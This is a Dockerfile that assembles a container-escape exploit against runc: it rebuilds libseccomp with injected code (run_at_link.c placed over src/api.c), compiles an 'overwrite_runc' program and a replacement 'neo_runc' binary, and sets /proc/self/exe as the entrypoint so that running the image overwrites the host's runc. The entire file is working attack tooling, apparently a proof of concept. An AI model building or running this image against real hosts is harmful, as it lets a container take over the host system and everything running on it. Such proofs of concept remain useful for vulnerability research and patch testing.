FROM ubuntu:18.04

# Get the libseccomp source code and required build dependecies 
# so that we can rebuild libseccomp with injected code run_at_link.c
RUN mkdir /build
RUN set -e -x ;\
    sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\
    apt -y update ;\
    apt-get -y install build-essential libseccomp-dev;\
    cd /build  ;\
    apt-get -y build-dep libseccomp ;\
    apt-get source libseccomp \
    && rm -rf /var/lib/apt/lists

# copy run_at_link.c into the source code into the libseccomp's source code
# and rebuild libseccomp with run_at_link.c injected.
COPY run_at_link.c /build/run_at_link.c
RUN set -e -x ;\
    cd /build/libseccomp-* ;\
    cp /build/run_at_link.c src/api.c ;\
    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\
    dpkg -i /buildf/*.deb

# build at overwrite_runc.c and place the built executable where run_at_link
# would find it.
COPY exploit /exploit
RUN set -ex; \
    cd /exploit; \
    gcc -o /overwrite_runc overwrite_runc.c buffer.c

COPY neo_runc /neo_runc


# Create a symbolic link to /proc/self/exe and set it as the image entrypoint
# since /proc/self/exe points to runc. this will run runc as the entrypoint
RUN set -e -x ;\
    ln -s /proc/self/exe /entrypoint
ENTRYPOINT [ "/entrypoint" ]
